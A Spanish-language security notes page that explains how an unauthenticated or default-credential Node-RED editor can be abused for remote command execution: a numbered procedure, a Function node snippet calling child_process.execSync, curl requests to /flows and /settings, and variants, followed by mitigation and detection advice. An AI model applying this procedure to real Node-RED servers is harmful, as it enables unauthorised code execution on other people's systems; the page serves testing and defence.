---
topic: Node-RED — ejecución mediante Function nodes
tags: [web, node-red, rce, nodejs, iot]
---

# Node-RED — ejecución mediante Function nodes

[🌐 English](node-red-rce.en.md) | **Español**

## Concepto

El editor de Node-RED permite crear flujos con nodos `function` que ejecutan JavaScript en el servidor. Si el editor está expuesto sin autenticación, o con credenciales por defecto, se puede desplegar un flujo que use `child_process` para ejecutar comandos.

## Cuándo aplica

- Puerto 1880 accesible y editor `/red` sin `adminAuth`.
- Credenciales por defecto o reutilizadas.
- Aplicaciones IoT que exponen Node-RED en la red interna.

## Procedimiento

1. Acceder a `/red` y comprobar si pide autenticación.
2. Revisar `/flows` y la versión en `/settings`.
3. Crear un flujo con un nodo `inject` y otro `function`.
4. Usar `child_process.execSync` y devolver el resultado.
5. Desplegar y lanzar el inyector.

## Comandos

```javascript
// Function node
const { execSync } = global.get('child_process') || require('child_process');
msg.payload = execSync('id').toString();
return msg;
```
```bash
curl -s http://<HOST>:1880/flows
curl -s http://<HOST>:1880/settings
```

## Variantes

- Importar un flujo malicioso desde `flows.json`.
- Usar el nodo `exec` si está instalado.
- Modificar `settings.js` si el sistema de archivos es escribible.

## Limitaciones

- El editor puede tener `adminAuth` o estar detrás de un proxy.
- La versión puede bloquear `require` en Function nodes.
- El flujo necesita un `inject` o un endpoint HTTP para dispararse.

## Mitigación

- Activar `adminAuth` y cambiar las credenciales por defecto.
- No exponer el editor a Internet; segmentar la red IoT.
- Ejecutar Node-RED con un usuario sin privilegios.

## Detección

- Flujos nuevos con nodos `function`, `exec` o `http in`.
- Conexiones a `/red` y `/flows` desde hosts no habituales.

## Referencias

- <https://nodered.org/docs/user-guide/runtime/securing-node-red>
- <https://attack.mitre.org/techniques/T1059/>
